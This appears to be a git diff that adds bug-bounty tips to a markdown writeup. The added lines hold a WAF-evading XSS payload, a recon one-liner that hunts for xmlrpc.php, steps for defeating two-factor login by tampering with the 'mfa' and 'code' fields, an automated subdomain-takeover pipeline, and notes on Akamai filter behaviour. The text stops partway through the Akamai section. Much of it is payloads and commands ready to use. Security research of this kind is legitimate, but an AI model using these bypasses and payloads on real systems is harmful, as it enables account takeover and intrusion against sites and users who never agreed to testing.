@@ -28,3 +28,57 @@ GET /?a=xss
 
 POST /?a=xss
 ```
+**New Payload to Bypass WAF**
+```js
+<script>alert?.(document?.domain)</script>
+```
+## Find xmlrpc in single shot
+```sh
+cat domain.txt | assetfinder --subs-only | httprobe | while read url; do xml=$(curl -s -L $url/xmlrpc.php | grep 'XML-RPC');echo -e "$url -> $xml";done | grep 'XML-RPC' | sort -u
+```
+## Bypass Multifactor Authentication
+1. Notice both the request while login when 2FA is enabled and disabled
+2. While 2FA is Disabled :
+**Request**
+```json
+{"email":"abc@mail.com","pass":"password","mfa":null,"code":""}
+```
+**Response**
+```json
+Location : https://abc.com/user/dashboard 
+```
+3. While 2FA is Enabled :
+**Resuest**
+```json
+{"email":"abc@mail.com","pass":"password","mfa":true,"code":""}
+```
+**Response**
+```json
+Location : https://abc.com/v1/proxy/authentication/authenticate
+```
+4. Tamper the Parameter and change the "mfa":null and "code":"" to disable the 2FA
+```json
+Location : https://abc.com/user/dashboard
+```
+## DOM XSS
+![dom-xss](/Writeups/Bug-Bounty-Tips/img/20201007_195906.jpg)
+## WAF Bypass 
+![waf-bypass](/Writeups/Bug-Bounty-Tips/img/waf-bypass.jpg)
+## Automate Subdomain Takeover
+```sh
+cat subfinder -dL domain.txt -o sub.txt && subjack -w sub.txt |toslack
+```
+***Put it on cron to run once a day***
+## Akami WAF Bypass
+Reflection in "a" tag, attribute context:
+```
+< => allowed
+<anything> => access denied
+quotes => allowed
+onanything= => access denied
+/ or \ or eval() => access denied
+```
+**Bypass*
+
+
+
